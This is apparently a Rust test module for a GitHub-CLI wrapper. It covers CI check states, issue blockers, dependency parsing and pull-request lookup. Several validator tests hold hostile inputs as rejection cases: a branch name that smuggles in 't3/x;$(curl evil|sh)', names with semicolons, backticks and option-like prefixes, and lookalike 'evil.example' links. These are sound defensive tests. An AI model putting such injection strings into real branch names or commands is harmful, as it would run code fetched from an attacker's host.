        for conclusion in [
            "failure",
            "cancelled",
            "timed_out",
            "action_required",
            "stale",
            "startup_failure",
            "something_new",
        ] {
            let got = gate(&[run("gate", "completed", Some(conclusion))]);
            assert_eq!(got.state, CheckState::Failed, "{conclusion}");
            assert_eq!(got.conclusion, conclusion);
        }
        // Completed with no conclusion is not a pass.
        let got = gate(&[run("gate", "completed", None)]);
        assert_eq!(got.state, CheckState::Failed);
        assert_eq!(got.conclusion, "completed");
    }

    #[test]
    fn a_run_that_has_not_completed_is_pending() {
        for status in ["queued", "in_progress", "waiting", "pending", "requested"] {
            let got = gate(&[run("gate", status, None)]);
            assert_eq!(got.state, CheckState::Pending, "{status}");
            assert_eq!(got.conclusion, status);
        }
    }

    #[test]
    fn a_check_with_no_run_is_missing_and_not_pending() {
        let fake = FakeTracker::answering([Answer::ok("[]")]);
        let got = checks(&fake, REPO, BASE_SHA, &names(&["gate"])).unwrap();
        assert_eq!(
            got,
            vec![CheckStatus {
                name: "gate".into(),
                state: CheckState::Missing,
                conclusion: String::new(),
                url: None,
            }]
        );
    }

    #[test]
    fn a_name_that_is_not_exactly_the_runs_is_missing() {
        let got = gate(&[run("Gate", "completed", Some("success"))]);
        assert_eq!(got.state, CheckState::Missing);
    }

    #[test]
    fn a_skipped_run_is_not_a_result_so_the_check_stays_missing() {
        // The factory's pull request is a draft until the checks pass, and a job guarded by
        // "not a draft" is skipped on it: nothing ran, so nothing passed.
        let got = gate(&[run("gate", "completed", Some("skipped"))]);
        assert_eq!(got.state, CheckState::Missing);
        assert_eq!(got.conclusion, "skipped");
    }

    #[test]
    fn several_runs_of_one_name_fail_before_they_pend_and_pend_before_they_pass() {
        type Run = (&'static str, Option<&'static str>);
        let state = |a: Run, b: Run| gate(&[run("gate", a.0, a.1), run("gate", b.0, b.1)]).state;
        let success: Run = ("completed", Some("success"));
        let neutral: Run = ("completed", Some("neutral"));
        let failure: Run = ("completed", Some("failure"));
        let skipped: Run = ("completed", Some("skipped"));
        let going: Run = ("in_progress", None);
        assert_eq!(state(success, failure), CheckState::Failed);
        // The conclusion and the link are the deciding run's, whichever came first.
        let mixed = gate(&[
            run("gate", "completed", Some("success")),
            with_url(
                run("gate", "completed", Some("failure")),
                "https://github.com/x/y/runs/2".into(),
            ),
        ]);
        assert_eq!(
            mixed,
            CheckStatus {
                name: "gate".into(),
                state: CheckState::Failed,
                conclusion: "failure".into(),
                url: Some("https://github.com/x/y/runs/2".into()),
            }
        );
        assert_eq!(state(going, success), CheckState::Pending);
        assert_eq!(state(success, neutral), CheckState::Passed);
        // A failure is not hidden by a run that is going again, in either order.
        assert_eq!(state(failure, going), CheckState::Failed);
        assert_eq!(state(going, failure), CheckState::Failed);
        // One skipped run among passing ones is not every run passing.
        assert_eq!(state(success, skipped), CheckState::Missing);
        assert_eq!(state(skipped, success), CheckState::Missing);
        // A skipped run does not hide one that is still going, or one that failed.
        assert_eq!(state(skipped, going), CheckState::Pending);
        assert_eq!(state(going, skipped), CheckState::Pending);
        assert_eq!(state(skipped, failure), CheckState::Failed);
        assert_eq!(state(failure, skipped), CheckState::Failed);
    }

    #[test]
    fn of_several_runs_that_decide_alike_the_first_one_listed_is_reported() {
        let got = gate(&[
            with_url(
                run("gate", "completed", Some("failure")),
                "https://github.com/x/y/runs/1".into(),
            ),
            with_url(
                run("gate", "completed", Some("cancelled")),
                "https://github.com/x/y/runs/2".into(),
            ),
        ]);
        assert_eq!(
            got,
            CheckStatus {
                name: "gate".into(),
                state: CheckState::Failed,
                conclusion: "failure".into(),
                url: Some("https://github.com/x/y/runs/1".into()),
            }
        );
    }

    #[test]
    fn checks_reads_every_page() {
        let fake = FakeTracker::answering([Answer::ok(format!(
            "{}\n{}",
            page(&[run("gate", "completed", Some("success"))]),
            page(&[run("lint", "in_progress", None)])
        ))]);
        let got = checks(&fake, REPO, BASE_SHA, &names(&["gate", "lint"])).unwrap();
        assert_eq!(got[0].state, CheckState::Passed);
        assert_eq!(got[1].state, CheckState::Pending);
    }

    #[test]
    fn checks_keeps_a_details_link_only_when_it_is_a_github_one() {
        for url in [
            "https://evil.example/x",
            "https://github.com.evil.example/x",
            "http://github.com/x",
        ] {
            let got = gate(&[with_url(
                run("gate", "completed", Some("failure")),
                url.into(),
            )]);
            assert_eq!(got.url, None, "{url}");
        }
        let none = gate(&[with_url(
            run("gate", "completed", Some("failure")),
            serde_json::Value::Null,
        )]);
        assert_eq!(none.url, None);
    }

    #[test]
    fn checks_refuses_a_commit_that_is_not_a_full_id_before_any_call() {
        for sha in [
            String::new(),
            "main".to_string(),
            "9f8e7d6".to_string(),
            "../x".to_string(),
            BASE_SHA.replace('9', "g"),
        ] {
            let fake = FakeTracker::answering([Answer::ok("[]")]);
            let error = checks(&fake, REPO, &sha, &names(&["gate"])).unwrap_err();
            assert!(is_refused(&error), "{sha}: {error}");
            assert!(fake.calls().is_empty(), "{sha}");
        }
    }

    #[test]
    fn checks_refuses_an_answer_that_is_not_a_list_of_runs() {
        for answer in ["{}", "not json", "[{\"name\":\"gate\"}]"] {
            let fake = FakeTracker::answering([Answer::ok(answer)]);
            let error = checks(&fake, REPO, BASE_SHA, &names(&["gate"])).unwrap_err();
            assert!(is_parse(&error), "{answer}: {error}");
        }
    }

    #[test]
    fn checks_that_gh_cannot_read_is_the_gh_failure() {
        let fake = FakeTracker::answering([Answer::fail(1, "gh: Not Found (HTTP 404)")]);
        let error = checks(&fake, REPO, BASE_SHA, &names(&["gate"])).unwrap_err();
        assert!(matches!(error, TrackerError::NotFound { .. }), "{error}");
    }

    // Blockers.

    fn blocked_by_call(issue: &str) -> Vec<String> {
        args(&[
            "api",
            &format!("repos/rawphp/softfac/issues/{issue}/dependencies/blocked_by"),
            "--paginate",
        ])
    }

    fn blocker_row(number: u64, state: &str, repo: &str) -> String {
        format!(
            "{{\"id\":{number},\"number\":{number},\"state\":\"{state}\",\"title\":\"t\",\"repository_url\":\"https://api.github.com/repos/{repo}\",\"labels\":[]}}"
        )
    }

    fn open_blocker(number: u64, repo: &str) -> Blocker {
        Blocker {
            repo: repo.into(),
            number,
        }
    }

    #[test]
    fn an_issue_with_no_blockers_has_no_open_blockers() {
        let fake = FakeTracker::answering([Answer::ok("[]")]);
        assert_eq!(open_blockers(&fake, REPO, 14).unwrap(), vec![]);
        assert_eq!(fake.calls(), vec![blocked_by_call("14")]);
    }

    #[test]
    fn a_closed_blocker_is_resolved_whatever_closed_it() {
        let fake = FakeTracker::answering([Answer::ok(format!(
            "[{},{}]",
            blocker_row(13, "closed", "rawphp/softfac"),
            blocker_row(12, "closed", "rawphp/other")
        ))]);
        assert_eq!(open_blockers(&fake, REPO, 14).unwrap(), vec![]);
    }

    #[test]
    fn only_the_exact_rest_state_closed_resolves_a_blocker_any_other_state_still_blocks() {
        let fake = FakeTracker::answering([Answer::ok(format!(
            "[{},{},{}]",
            blocker_row(13, "unknown", "rawphp/softfac"),
            blocker_row(12, "CLOSED", "rawphp/softfac"),
            blocker_row(11, "closed", "rawphp/softfac")
        ))]);
        assert_eq!(
            open_blockers(&fake, REPO, 14).unwrap(),
            vec![
                open_blocker(13, "rawphp/softfac"),
                open_blocker(12, "rawphp/softfac")
            ]
        );
    }

    #[test]
    fn open_blockers_keep_the_repo_they_are_in() {
        let fake = FakeTracker::answering([Answer::ok(format!(
            "[{},{},{}]",
            blocker_row(13, "open", "rawphp/softfac"),
            blocker_row(12, "closed", "rawphp/softfac"),
            blocker_row(7, "open", "acme/widgets")
        ))]);
        assert_eq!(
            open_blockers(&fake, REPO, 14).unwrap(),
            vec![
                open_blocker(13, "rawphp/softfac"),
                open_blocker(7, "acme/widgets")
            ]
        );
    }

    #[test]
    fn blockers_on_every_page_are_read() {
        // `gh api --paginate` may print each page as its own array.
        let fake = FakeTracker::answering([Answer::ok(format!(
            "[{}][{}]",
            blocker_row(1, "closed", "rawphp/softfac"),
            blocker_row(2, "open", "rawphp/softfac")
        ))]);
        assert_eq!(
            open_blockers(&fake, REPO, 14).unwrap(),
            vec![open_blocker(2, "rawphp/softfac")]
        );
    }

    #[test]
    fn blockers_that_cannot_be_read_are_an_error() {
        let spawn = FakeTracker::new();
        let error = open_blockers(&spawn, REPO, 14).unwrap_err();
        assert!(
            matches!(&error, TrackerError::Other(m) if m.contains("cannot start")),
            "{error}"
        );

        let failed = FakeTracker::answering([Answer::fail(1, "Not Found")]);
        assert!(is_failed(&open_blockers(&failed, REPO, 14).unwrap_err()));

        for stdout in ["oops", "", "{\"message\":\"x\"}"] {
            let fake = FakeTracker::answering([Answer::ok(stdout)]);
            let error = open_blockers(&fake, REPO, 14).unwrap_err();
            assert!(is_parse(&error), "{stdout}: {error}");
        }
    }

    #[test]
    fn an_open_blocker_whose_repo_is_unknown_is_an_error_not_a_guess() {
        for row in [
            "{\"number\":3,\"state\":\"open\"}",
            "{\"number\":3,\"state\":\"open\",\"repository_url\":\"x\"}",
        ] {
            let fake = FakeTracker::answering([Answer::ok(format!("[{row}]"))]);
            let error = open_blockers(&fake, REPO, 14).unwrap_err();
            assert!(is_parse(&error), "{row}: {error}");
        }
    }

    fn body_call(issue: &str) -> Vec<String> {
        args(&["issue", "view", issue, "--repo", REPO, "--json", "body"])
    }

    fn rest_call(repo: &str, issue: &str) -> Vec<String> {
        args(&["api", &format!("repos/{repo}/issues/{issue}")])
    }

    fn body_reply(body: &str) -> String {
        serde_json::json!({ "body": body }).to_string()
    }

    #[test]
    fn text_blockers_of_a_body_without_the_section_read_nothing_more() {
        let fake = FakeTracker::answering([Answer::ok(body_reply("## Cause\nSee #5\n"))]);
        assert_eq!(text_blockers(&fake, REPO, 14).unwrap(), vec![]);
        assert_eq!(fake.calls(), vec![body_call("14")]);

        let empty = FakeTracker::answering([Answer::ok("{\"body\":null}")]);
        assert_eq!(text_blockers(&empty, REPO, 14).unwrap(), vec![]);
    }

    #[test]
    fn text_blockers_are_the_named_issues_that_are_not_closed() {
        let fake = FakeTracker::answering([
            Answer::ok(body_reply(
                "## Depends on\n#13, acme/widgets#7 and #5\n\n## Fix\n#99\n",
            )),
            Answer::ok("{\"number\":13,\"state\":\"open\",\"title\":\"t\"}"),
            Answer::ok("{\"number\":7,\"state\":\"closed\"}"),
            Answer::ok("{\"number\":5,\"state\":\"open\"}"),
        ]);
        assert_eq!(
            text_blockers(&fake, REPO, 14).unwrap(),
            vec![open_blocker(13, REPO), open_blocker(5, REPO)]
        );
        assert_eq!(
            fake.calls(),
            vec![
                body_call("14"),
                rest_call(REPO, "13"),
                rest_call("acme/widgets", "7"),
                rest_call(REPO, "5"),
            ]
        );
    }

    #[test]
    fn text_blockers_resolved_once_every_named_issue_is_closed() {
        let fake = FakeTracker::answering([
            Answer::ok(body_reply("## Depends on\n#13\n")),
            Answer::ok("{\"state\":\"closed\"}"),
        ]);
        assert_eq!(text_blockers(&fake, REPO, 14).unwrap(), vec![]);
    }

    #[test]
    fn only_the_exact_rest_state_closed_resolves_a_named_issue_any_other_still_blocks() {
        let fake = FakeTracker::answering([
            Answer::ok(body_reply("## Depends on\n#13, #12, #11\n")),
            Answer::ok("{\"state\":\"CLOSED\"}"),
            Answer::ok("{\"state\":\"unknown\"}"),
            Answer::ok("{\"state\":\"closed\"}"),
        ]);
        assert_eq!(
            text_blockers(&fake, REPO, 14).unwrap(),
            vec![open_blocker(13, REPO), open_blocker(12, REPO)]
        );
    }

    #[test]
    fn a_depends_on_section_naming_more_than_the_cap_is_an_error_before_any_is_read() {
        let refs = |count: usize| {
            (1..=count)
                .map(|at| format!("#{at}"))
                .collect::<Vec<_>>()
                .join(" ")
        };

        let over = FakeTracker::answering([Answer::ok(body_reply(&format!(
            "## Depends on\n{}\n",
            refs(MAX_DEPENDS_ON + 1)
        )))]);
        assert!(is_parse(&text_blockers(&over, REPO, 14).unwrap_err()));
        assert_eq!(over.calls(), vec![body_call("14")]);

        let at_cap = FakeTracker::answering(
            std::iter::once(Answer::ok(body_reply(&format!(
                "## Depends on\n{}\n",
                refs(MAX_DEPENDS_ON)
            ))))
            .chain((0..MAX_DEPENDS_ON).map(|_| Answer::ok("{\"state\":\"closed\"}"))),
        );
        assert_eq!(text_blockers(&at_cap, REPO, 14).unwrap(), vec![]);
        assert_eq!(at_cap.calls().len(), MAX_DEPENDS_ON + 1);
    }

    #[test]
    fn a_named_issue_that_cannot_be_read_is_an_error_not_a_resolved_blocker() {
        let body = body_reply("## Depends on\n#13, #5\n");
        let missing = FakeTracker::answering([
            Answer::ok(body.clone()),
            Answer::ok("{\"state\":\"closed\"}"),
            Answer::fail(1, "gh: Not Found (HTTP 404)"),
        ]);
        let error = text_blockers(&missing, REPO, 14).unwrap_err();
        assert!(matches!(error, TrackerError::NotFound { .. }), "{error}");

        let oops = FakeTracker::answering([Answer::ok(body.clone()), Answer::ok("oops")]);
        assert!(is_parse(&text_blockers(&oops, REPO, 14).unwrap_err()));

        let empty = FakeTracker::answering([Answer::ok(body), Answer::ok("{}")]);
        assert!(is_parse(&text_blockers(&empty, REPO, 14).unwrap_err()));
    }

    #[test]
    fn a_body_that_cannot_be_read_is_an_error() {
        let failed = FakeTracker::answering([Answer::fail(1, "boom")]);
        assert!(is_failed(&text_blockers(&failed, REPO, 14).unwrap_err()));
        let oops = FakeTracker::answering([Answer::ok("oops")]);
        assert!(is_parse(&text_blockers(&oops, REPO, 14).unwrap_err()));
    }

    // Pull requests on a head.

    const PR_LIST_FIELDS: &str = "number,url,headRefName,baseRefName,isCrossRepository,author";

    fn listed_pr(number: u64, head: &str) -> String {
        serde_json::json!({
            "number": number,
            "url": format!("https://github.com/rawphp/softfac/pull/{number}"),
            "state": "OPEN",
            "headRefName": head,
            "baseRefName": "main",
            "isCrossRepository": false,
            "author": {"login": "rawphp"},
        })
        .to_string()
    }

    fn pr_list_call(head: &str) -> Vec<String> {
        args(&[
            "pr",
            "list",
            "--repo",
            REPO,
            "--state",
            "open",
            "--head",
            head,
            "--limit",
            "100",
            "--json",
            PR_LIST_FIELDS,
        ])
    }

    #[test]
    fn open_pull_requests_on_head_lists_the_open_pull_requests_from_the_branch_with_the_exact_call()
    {
        // `gh pr list --json author` carries more than the login; a blank login is nobody.
        let second = serde_json::json!({
            "number": 15,
            "url": "https://github.com/rawphp/softfac/pull/15",
            "headRefName": "t3code/abc",
            "baseRefName": "dev",
            "isCrossRepository": true,
            "author": {"id": "", "is_bot": false, "login": "", "name": ""},
        });
        let fake = FakeTracker::answering([Answer::ok(format!(
            "[{},{second}]",
            listed_pr(14, "t3code/abc")
        ))]);
        assert_eq!(
            open_pull_requests_on_head(&fake, REPO, "t3code/abc").unwrap(),
            vec![
                OpenPullRequest {
                    number: 14,
                    url: "https://github.com/rawphp/softfac/pull/14".into(),
                    head_ref: "t3code/abc".into(),
                    base_ref: "main".into(),
                    cross_repository: false,
                    author: Some("rawphp".into()),
                },
                OpenPullRequest {
                    number: 15,
                    url: "https://github.com/rawphp/softfac/pull/15".into(),
                    head_ref: "t3code/abc".into(),
                    base_ref: "dev".into(),
                    cross_repository: true,
                    author: None,
                },
            ]
        );
        assert_eq!(fake.calls(), vec![pr_list_call("t3code/abc")]);
    }

    #[test]
    fn open_pull_requests_on_head_names_a_bot_author_as_app_slash_login() {
        let bot = serde_json::json!({
            "number": 16,
            "url": "https://github.com/rawphp/softfac/pull/16",
            "headRefName": "t3code/abc",
            "baseRefName": "main",
            "isCrossRepository": false,
            "author": {"login": "dependabot", "__typename": "Bot"},
        });
        let fake = FakeTracker::answering([Answer::ok(format!("[{bot}]"))]);
        let got = open_pull_requests_on_head(&fake, REPO, "t3code/abc").unwrap();
        assert_eq!(got[0].author.as_deref(), Some("app/dependabot"));
    }

    #[test]
    fn open_pull_requests_on_head_is_empty_when_the_branch_has_none() {
        let fake = FakeTracker::answering([Answer::ok("[]")]);
        assert_eq!(
            open_pull_requests_on_head(&fake, REPO, "t3code/abc").unwrap(),
            vec![]
        );
    }

    #[test]
    fn open_pull_requests_on_head_refuses_a_branch_name_that_could_be_taken_for_an_option_before_calling_gh()
     {
        for head in ["-x", "--force", "a b", "a..b", "", "a\u{1}b"] {
            let fake = FakeTracker::answering([Answer::ok("[]")]);
            let error = open_pull_requests_on_head(&fake, REPO, head).unwrap_err();
            assert!(is_refused(&error), "{head:?}: {error}");
            assert!(fake.calls().is_empty(), "{head:?}");
        }
    }

    #[test]
    fn keep_a_plain_ref_name_safe_as_one_argument_to_git() {
        for name in ["t3code/abc", "feat/x;y", "t3/x`y`"] {
            assert!(is_plain_ref_name(name), "{name}");
        }
        for name in ["", "-x", "--force", "a b", "a..b", "a\u{1}b", "a\tb"] {
            assert!(!is_plain_ref_name(name), "{name:?}");
        }
    }

    #[test]
    fn let_only_an_ordinary_branch_name_into_a_command_a_session_runs() {
        for name in ["t3code/abc", "t3/2e8db933", "feat/x_y-z.1"] {
            assert!(is_safe_branch_name(name), "{name}");
        }
        for name in [
            "",
            "-x",
            "a b",
            "a..b",
            "feat/x;y",
            "t3/x`y`",
            "t3/x;$(curl evil|sh)",
        ] {
            assert!(!is_safe_branch_name(name), "{name:?}");
        }
    }

    #[test]
    fn a_branch_path_has_no_empty_or_dot_segment() {
        for name in ["main", "release/1.0", "a/b/c"] {
            assert!(is_branch_path(name), "{name}");
        }
        for name in ["", "..", "../x", "a/../b", "./x", "/x", "x//y", "x/"] {
            assert!(!is_branch_path(name), "{name:?}");
        }
    }

    #[test]
    fn open_pull_requests_on_head_refuses_an_answer_it_cannot_read() {
        for text in ["", "no", "{}", "[{\"number\":\"x\"}]"] {
            let fake = FakeTracker::answering([Answer::ok(text)]);
            let error = open_pull_requests_on_head(&fake, REPO, "t3code/abc").unwrap_err();
            assert!(is_parse(&error), "{text}: {error}");
        }
    }

    // ----- End of part A tests -----

    // ----- Part B tests -----

    // ----- End of part B tests -----
}
